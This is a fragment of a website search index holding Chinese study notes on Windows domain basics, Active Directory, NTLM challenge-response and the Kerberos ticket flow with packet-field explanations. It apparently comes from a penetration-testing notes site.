\u57df\u63a7\u5236\u5668 \uff08Domain Controller\uff0c\u7b80\u5199\u4e3aDC\uff09 \u7684\u5b89\u5168\u8ba4\u8bc1\u3002\u6bcf\u4e2a\u57df\u81f3\u5c11\u8981\u6709\u4e00\u4e2a\u57df\u63a7\u5236\u5668\u3002 \u5f53\u67d0\u8ba1\u7b97\u673a\u8fde\u5165\u57df\u65f6\uff0cDC\u5c31\u4f1a\u9274\u522b\u8fd9\u53f0\u7535\u8111\u662f\u5426\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u57df\u7684\uff0c\u7528\u6237\u4f7f\u7528\u7684\u767b\u5f55\u8d26\u53f7\u662f\u5426\u5b58\u5728\u3001\u5bc6\u7801\u662f\u5426\u6b63\u786e\u3002\u5982\u679c\u4ee5\u4e0a\u4fe1\u606f\u4e0d\u6b63\u786e\uff0c\u57df\u63a7\u5236\u5668\u5c31\u62d2\u7edd\u8fd9\u4e2a\u7528\u6237\u4ece\u8fd9\u53f0\u7535\u8111\u767b\u5f55\u3002\u4e0d\u80fd\u767b\u5f55\uff0c\u7528\u6237\u5c31\u4e0d\u80fd\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u6709\u6743\u9650\u4fdd\u62a4\u7684\u8d44\u6e90 \u3002 \u53e6\u5916\uff0c\u5f53\u4e00\u4e2a\u57df\u548c\u53e6\u4e00\u4e2a\u57df\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u540e\uff0c\u4e24\u4e2a\u57df\u5c31\u53ef\u4ee5\u6309\u9700\u8981\u76f8\u4e92\u7ba1\u7406","title":"\u57df"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_5","text":"\u201c \u5de5\u4f5c\u7ec4\u662f\u4e00\u7fa4\u8ba1\u7b97\u673a\u7684\u96c6\u5408\uff0c\u5b83\u4ec5\u4ec5\u662f\u4e00\u4e2a\u903b\u8f91\u7684\u96c6\u5408\uff0c\u5404\u81ea\u8ba1\u7b97\u673a\u8fd8\u662f\u5404\u81ea\u7ba1\u7406\u7684\uff0c\u4f60\u8981\u8bbf\u95ee\u5176\u4e2d\u7684\u8ba1\u7b97\u673a\uff0c\u8fd8\u662f\u8981\u5230\u88ab\u8bbf\u95ee\u8ba1\u7b97\u673a\u4e0a\u6765\u5b9e\u73b0\u7528\u6237\u9a8c\u8bc1\u7684\u3002\u800c\u57df\u4e0d\u540c\uff0c\u57df\u662f\u4e00\u4e2a\u6709\u5b89\u5168\u8fb9\u754c\u7684\u8ba1\u7b97\u673a\u96c6\u5408\uff0c\u5728\u540c\u4e00\u4e2a\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u5f7c\u6b64\u4e4b\u95f4\u5df2\u7ecf\u5efa\u7acb\u4e86\u4fe1\u4efb\u5173\u7cfb\uff0c\u5728\u57df\u5185\u8bbf\u95ee\u5176\u4ed6\u673a\u5668\uff0c\u4e0d\u518d\u9700\u8981\u88ab\u8bbf\u95ee\u673a\u5668\u7684\u8bb8\u53ef\u4e86\u3002 \u201d","title":"\u5de5\u4f5c\u7ec4\u548c\u57df\u7684\u533a\u522b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_6","text":"\u6d3b\u52a8\u76ee\u5f55 (Active Directory,AD) ,\u7528\u4e8e\u5b58\u50a8\u6709\u5173\u7f51\u7edc\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u51c6\u786e\u7684\u627e\u5230\u6240\u9700\u7684\u4fe1\u606f\u670d\u52a1,\u201c \u5982\u679c\u628a\u4f01\u4e1a\u7684\u5185\u7f51\u770b\u6210\u4e00\u672c\u5b57\u5178\uff0c\u90a3\u4e48 \u5185\u7f51\u91cc\u7684\u8d44\u6e90\u5c31\u662f\u5b57\u5178\u91cc\u7684\u5185\u5bb9\uff0c\u6d3b\u52a8\u76ee\u5f55\u5c31\u76f8\u5f53\u4e8e\u5b57\u5178\u7684\u7d22\u5f15 \u201d \u6d3b\u52a8\u76ee\u5f55\u7684\u529f\u80fd\uff1a \u8d26\u53f7\u96c6\u4e2d\u7ba1\u7406 \u8f6f\u4ef6\u96c6\u4e2d\u7ba1\u7406 \u73af\u5883\u96c6\u4e2d\u7ba1\u7406 \u589e\u5f3a\u5b89\u5168\u6027 \u66f4\u53ef\u9760\uff0c\u66f4\u77ed\u7684\u5b95\u673a\u65f6\u95f4 \u201c\u8981\u5b9e\u73b0\u57df\u73af\u5883\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5b89\u88c5AD\uff0c \u5982\u679c\u5185\u7f51\u4e2d\u7684\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5\u4e86AD\uff0c\u5b83\u5c31\u53d8\u6210\u4e86DC(\u7528\u4e8e\u5b58\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u7684\u8ba1\u7b97\u673a)\u3002 \u201d","title":"\u6d3b\u52a8\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#ntlm","text":"NTLM\u4e5f\u662f\u4e00\u4e2a\u8ba4\u8bc1\u534f\u8bae\uff0c\u4e0eKerberos\u534f\u8bae\u529f\u80fd\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7NTLM\u7684\u5b89\u5168\u6027\u53ef\u6ca1\u6709Kerberos\u597d","title":"NTLM\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_7","text":"NTLM\u534f\u8bae\u9a8c\u8bc1\u673a\u5236\u662f\u57fa\u4e8e \u6311\u6218(chanllage)/\u56de\u5e94(response) \u6a21\u5f0f\u7684 \u5b83\u7684\u9a8c\u8bc1\u6a21\u5f0f\u5927\u81f4\u5982\u4e0b: \u7528\u6237\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\uff0c\u672c\u5730\u628a\u5bc6\u7801\u52a0\u5bc6\u4e3a\u4e00\u4e2ahash\u503c\uff0c\u79f0\u4e3a NTML-Hash \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u7528\u6237\u540d \uff08\u8fd9\u4e2a\u6570\u636e\u79f0\u4e3a TYPE 1 Negotiate \uff09 \u670d\u52a1\u7aef\u63a5\u6536\u8bf7\u6c42\uff0c\u5224\u65ad\u6570\u636e\u5e93\u4e2d\u8be5\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u751f\u6210\u4e00\u4e2a16\u4f4d\u968f\u673a\u6570\u79f0\u4e4b\u4e3achanllage\u3002\u540c\u65f6\u5c06chanllage\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef \uff08 TYPE 2 \uff09 \u5ba2\u6237\u7aef\u6536\u5230chanllage\u540e\u5c06\u5176\u7528\u4e0a\u9762\u751f\u6210\u7684hash\u503c\u6765\u52a0\u5bc6\u8fd9\u4e2achanllange\uff0c\u5e76\u4e0e\u7528\u6237\u540d\uff0cchanllange\u7b49\u7ec4\u5408\u5230\u4e00\u8d77\u5f97\u5230 Net-NTLMHash \u6700\u540e\u5c06 Net-NTLMHash \u5c01\u88c5\u5230 TYPE 3 NTLM_AUTH \u6d88\u606f\u4e2d\u53d1\u5f80\u670d\u52a1\u5668\u3002 \u670d\u52a1\u5668\u6536\u5230TYPE3\u540e\uff0c\u7528\u81ea\u5df1\u6570\u636e\u5e93\u4e2d\u8be5\u7528\u6237\u7684\u5bc6\u7801\u7684NTML-Hash\u52a0\u5bc6chanllage\uff0c\u5e76\u6bd4\u8f83\u81ea\u5df1\u8ba1\u7b97\u51fa\u7684 Net-NTLMHash \u4e0e\u5ba2\u6237\u7aef\u53d1\u8fc7\u6765\u7684 Net-NTLMHash \uff0c\u82e5\u76f8\u540c\u5219\u8ba4\u8bc1\u6210\u529f \uff08\u4ee5\u4e0a\u662f\u5ba2\u6237\u7aef-\u670d\u52a1\u7aef\u6a21\u578b\uff0c\u82e5\u662f\u5728\u57df\u4e2d\uff0c\u9a8c\u8bc1\u6b65\u9aa4\u5c31\u4f1a\u6709\u70b9\u4e0d\u540c\uff09 \u82e5\u5728\u57df\u4e2d\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u5728\u7b2c5\u6b65\u6536\u5230TYPE3\u540e\u4e0d\u4f1a\u81ea\u884c\u8fdb\u884c\u6bd4\u5bf9\uff0c\u800c\u662f\u5c06 Net NTLM-Hash \u8f6c\u53d1\u7ed9\u57df\u63a7\u5236\u5668DC\uff0c\u7531DC\u8fdb\u884c\u6700\u540e\u7684 Net NTLM-Hash \u6bd4\u8f83\u8ba4\u8bc1","title":"\u9a8c\u8bc1\u673a\u5236"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#kerberos","text":"Kerberos\u534f\u8bae\uff0c\u662f\u4e00\u4e2a\u5e38\u7528\u7684\u8ba4\u8bc1\u4e0e\u6388\u6743\u534f\u8bae(\u4e0b\u9762\u53ea\u662f\u7b80\u5316\u8fc7\u7684\u5927\u81f4\u6d41\u7a0b\uff0c\u5177\u4f53\u6d41\u7a0b\u8bf7\u770b\u4e0b\u9762\u7684wireshark\u6293\u5305\u5206\u6790)","title":"Kerberos\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_8","text":"","title":"\u6574\u4f53\u6d41\u7a0b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#_9","text":"Client : Application Client \u5e94\u7528\u5ba2\u6237\u7aef AS : Authentication Server \u7528\u6765\u8ba4\u8bc1\u7528\u6237\u8eab\u4efd TGS : Ticket-Granting Service \u7528\u6765\u6388\u6743\u670d\u52a1\u8bbf\u95ee SS : Service Server \u7528\u6237\u6240\u8bf7\u6c42\u7684\u670d\u52a1 \u5176\u4e2dAS\u548cTGS\u90fd\u5c5e\u4e8eKDC\u7cfb\u7edf\uff08 \u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3 \uff09","title":"\u53c2\u4e0e\u7684\u5173\u952e\u89d2\u8272"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#kerberos_1","text":"\u4ee5\u4e0b\u7684\u52a0\u5bc6\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6","title":"Kerberos\u8ba4\u8bc1\u8be6\u89e3\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#1","text":"\u7528\u6237\u5148\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u5176\u4e2d\u5bc6\u7801\u5728\u8fd9\u4e2a\u9636\u6bb5\u4f1a\u88ab\u5355\u5411hash\u51fd\u6570\u52a0\u5bc6\u4e3a\u4e00\u4e2a\u5bc6\u94a5\uff0c\u7528\u6765\u89e3\u5bc6\u540e\u9762\u7684\u4fe1\u606f","title":"1.\u7528\u6237\u767b\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#2clientkdc","text":"","title":"2.\u8bf7\u6c42\u8eab\u4efd\u8ba4\u8bc1\uff08client\u548ckdc\u53cc\u5411\u8ba4\u8bc1\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#21-as","text":"\u5ba2\u6237\u7aef\u5411as\u53d1\u9001\u7528\u6237\u540d\u4fe1\u606f\uff08\u660e\u6587\uff09\uff08\u8fdb\u53d1\u9001\u7528\u6237\u540d\u800c\u6ca1\u6709\u53d1\u9001\u5bc6\u7801\uff09","title":"2.1 \u5ba2\u6237\u7aef\u5411AS\u53d1\u9001\u8ba4\u8bc1\u8bf7\u6c42"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#22as","text":"AS\u5148\u628a\u7528\u6237\u540d\u5728\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u4e00\u4e0b\uff0c\u5982\u679c\u8be5\u7528\u6237\u540d\u5b58\u5728\u5219\u627e\u5230\u8be5\u7528\u6237\u7684\u5bc6\u7801\u4f7f\u7528\u5355\u5411hash\u51fd\u6570\u751f\u6210client\u5bc6\u94a5\u5e76\u8fd4\u56deMsg A\u548cB\u3002 A\u4e2d\u7684\u5185\u5bb9\u662f\u4e00\u4e2a\u88abClient\u5bc6\u94a5\u52a0\u5bc6\u7684\u7528\u4e8e\u751f\u6210Authenticator1\u7684\u6570\u636e B\u4e2d\u7684\u5185\u5bb9\u662f\u4e00\u4e2a\u88abTGS\u5bc6\u94a5\u52a0\u5bc6\u7684\u4e00\u5806\u4fe1\u606f\u53eb\u505a TGT \uff0c\u5f53\u524d\u65e0TGS\u5bc6\u94a5\u6545\u65e0\u6cd5\u89e3\u5f00\uff0c\u5176\u4e2d\u5305\u542b \u5ba2\u6237\u7aefID\uff0c\u6709\u6548\u671f \uff0cClient\u7f51\u7edc\u5730\u5740\u4ee5\u53caMSG A\u89e3\u5bc6\u540e\u7684\u5185\u5bb9","title":"2.2AS\u786e\u8ba4\u5ba2\u6237\u7aef\u8eab\u4efd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#3-clientkdcserver","text":"","title":"3. \u8bf7\u6c42\u670d\u52a1\u6388\u6743\uff08client\u8bf7\u6c42kdc\u8ba4\u8bc1server\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#31-tgs","text":"Client\u5728MSG C\u5411TGS\u53d1\u9001 \u8bf7\u6c42\u7684\u670d\u52a1\u7684ID\uff0c2.2\u4e2d\u7684TGT\uff0cMSG D \u53d1\u9001\u7531 [Client/TGS SessionKey] \u52a0\u5bc6\u7684Authenticator 1 {Client ID, Timestamp}\u3002","title":"3.1 \u5ba2\u6237\u7aef\u5411TGS\u53d1\u9001\u8bf7\u6c42\u670d\u52a1\u6388\u6743\u8bf7\u6c42"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#32-tgsclient","text":"Msg E \u4f7f\u7528 [Service\u5bc6\u94a5] \u52a0\u5bc6\u7684Client-To-Server Ticket, \u8be5Ticket\u4e2d\u5305\u542b\u4e86\u5982\u4e0b\u4fe1\u606f: [Client/Server SessionKey] Client\u7f51\u7edc\u5730\u5740 Ticket\u6709\u6548\u65f6\u95f4 Client ID Msg F \u4f7f\u7528 **[Client/TGS SessionKey] \u52a0\u5bc6\u7684 [Client/Server SessionKey] **\u3002","title":"3.2 TGS\u4e3aClient\u54cd\u5e94\u670d\u52a1\u6388\u6743\u7968\u636e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#4-clientss","text":"","title":"4. \u53d1\u9001\u670d\u52a1\u8bf7\u6c42\uff08client\u4e0ess\u53cc\u5411\u8ba4\u8bc1\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#41-clientssservice-server","text":"\u53d1\u9001\u7684\u6d88\u606f\u4e2d\u5305\u62ec\uff1a Msg E \u4e0a\u4e00\u6b653.2\u4e2d\uff0cTGS\u4e3aClient\u54cd\u5e94\u7684\u6d88\u606fMsg E\u3002\u8be5\u6d88\u606f\u53ef\u4ee5\u7406\u89e3\u4e3a\u7531Client\u4e3aSS\u643a\u5e26\u7684\u6d88\u606f\u3002 Msg G \u7531 **[Client/Server SessionKey] \u52a0\u5bc6\u7684 Authenticator 2 **\uff0c\u5305\u542b{Client ID, Timestamp}\u4fe1\u606f\u3002 \u8fd9\u91cc\u7684Authenticator 2\u533a\u522b\u4e8e\u524d\u97623.1\u6b65\u9aa4\u4e2d\u7684Authenticator 1\u3002 Note **[Client/Server SessionKey] \u5e76\u672a\u76f4\u63a5\u900f\u660e\u4f20\u8f93\uff0c\u800c\u662f\u88ab\u5305\u542b\u5728\u4f7f\u7528 [Service\u5bc6\u94a5]**\u52a0\u5bc6\u7684Msg E\u4e2d\u3002 \u65e2\u7136 **[Client/Server SessionKey] \u5e76\u4e0d\u76f4\u63a5\u900f\u660e\u4f20\u8f93\uff0c Client\u9700\u8981\u5411SS\u8bc1\u660e\u81ea\u5df1\u62e5\u6709\u6b63\u786e\u7684 [Client/Server SessionKey] \uff0c\u6240\u4ee5\uff0cAuthenticator 2\u4f7f\u7528\u4e86 [Client/Server SessionKey]**\u52a0\u5bc6\u3002","title":"4.1 Client\u5411SS(Service Server)\u53d1\u9001\u670d\u52a1\u8bf7\u6c42"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#42-ssclient","text":"","title":"4.2 SS\u54cd\u5e94Client"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#kerberos_2","text":"\u4ee5\u4e0a\u662fkerberos\u534f\u8bae\u7b80\u5316\u56fe","title":"Kerberos\u6293\u5305\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#asreq","text":"\u5373\u5ba2\u6237\u7aef\u5f80\u670d\u52a1\u7aef\u7684\u7b2c\u4e00\u6b21\u901a\u8baf \u6211\u6293\u5230\u7684\u5305\u7684\u6837\u5b50,\u6211\u4eec\u6765\u89e3\u8bfb\u4e00\u4e0b 1.pvno: \u6807\u8bb0\u7740kerberos\u534f\u8bae\u7684\u7248\u672c 2.msg-type: \u6807\u8bb0\u7740\u8fd9\u4e2a\u5305\u7684\u7c7b\u578b\uff0c ASREQ\u5bf9\u5e94\u7684\u5c31\u662fKRBAS_REQ(0x0a) 3.padata:\u7528\u4e8e\u5b58\u50a8\u4e00\u4e9b\u8ba4\u8bc1\u4fe1\u606f \u5176\u5b9e\u8fd9\u4e2a\u5934\u4e0b\u9762\u8fd8\u6709\u5f88\u591a\u4e0d\u540c\u7684\u7c7b\u578b\u7684\u5934\uff0c\u4f46\u662f\u8fd9\u91cc\u6293\u5230\u4e86PA-DATA PA-ENC-TIMESTAMP\u548cPA-DATA PA-PAC-REQUEST\u8fd9\u4e24\u4e2a\u5934\u90e8\uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u5934\u90e8\u662fpadata\u6700\u5e38\u7528\u6700\u6838\u5fc3\u7684\u5934\u90e8. PA-DATA PA-ENC-TIMESTAMP : \u5c31\u662f\u7528\u6237hash\u52a0\u5bc6\u7684\u65f6\u95f4\u6233,\u4f5c\u7528\u5728\u4e8e:as\u914d\u5408\u7528\u6237\u7684\u660e\u6587\u8d26\u6237(cname\u5934)\u5728\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u8be5\u7528\u6237\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u53d6\u7528\u5176hash\u6765\u89e3\u5bc6\u8fd9\u4e2a\u65f6\u95f4\u6233\uff0c\u82e5\u63ed\u79d8\u6210\u529f\u5219\u8ba4\u8bc1\u901a\u8fc7 PA-DATA PA-ENC-TIMESTAMP: \u8fd9\u4e2a\u662f\u542f\u7528PAC(\u4e00\u4e2a\u63a7\u5236\u7528\u6237\u6743\u9650\u7684\u4e1c\u897f)\u652f\u6301\u7684\u6269\u5c55\u3002 4.req-body:\u8bf7\u6c42\u4e3b\u4f53\uff0c\u4e5f\u5305\u542b\u4e86\u8bb8\u591a\u4fe1\u606f.\u8fd9\u4e2a\u5934\u91cc\u9762\u6bd4\u8f83\u91cd\u8981\u7684\u4e1c\u897f\u662f cname:\u5b58\u50a8\u7740\u53d1\u9001\u8bf7\u6c42\u7684\u7528\u6237\u540d\uff08\u660e\u6587\u7528\u6237\u540d\uff09 sname:\u8fd9\u4e2a\u5305\u542b\u7684\u662f\u670d\u52a1\u7aef\u7684\u8eab\u4efd, \u5728ASREQ\u91cc\u9762\u662fkrbtgt \uff0c\u8fd8\u6709\u6240\u5728\u57df\u540d\u79f0\u3002till\u4e3a\u5230\u671f\u65f6\u95f4\uff0cnonce\u4e3a\u968f\u673a\u751f\u6210\u6570 realm:\u6240\u5728\u57df\u540d\u79f0 etype:\u544a\u77e5\u670d\u52a1\u5668\uff0c\u8fd9\u4e2ahash\u7684\u52a0\u5bc6\u65b9\u5f0f \u4e4b\u524d\u4e00\u76f4\u56f0\u6270\u6211\u7684 \u201c\u4e3a\u4ec0\u4e48\u6709\u4e9b\u6587\u7ae0\u8bf4\u7684\u7b2c\u4e00\u6b65\u662f\u5411\u670d\u52a1\u5668\u53d1\u9001\u660e\u6587\u8d26\u6237\u540d\uff0c\u6709\u4e9b\u6587\u7ae0\u662f\u5411\u670d\u52a1\u5668\u53d1\u9001\u65f6\u95f4\u6233hash\u201d\u95ee\u9898\u6293\u4e86\u4e00\u4e0b\u5305\u5c31\u61c2\u4e86..","title":"ASREQ"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/#asrep","text":"1.ticket:\u8fd9\u4e2a\u5c31\u662fTGT\u4e86\u3002 tkt-vno:\u7968\u636e\u683c\u5f0f\u7248\u672c\u53f7 realm:\u6240\u5728\u57df\u540d sname:\u540casres enc-part:\u88abkrbtgt\u5bc6\u94a5\u52a0\u5bc6\u7684\u7968\u636e\u672c\u4f53\u90e8\u5206 2.enc-part:\u88abclient hash \u52a0\u5bc6\u7684login session 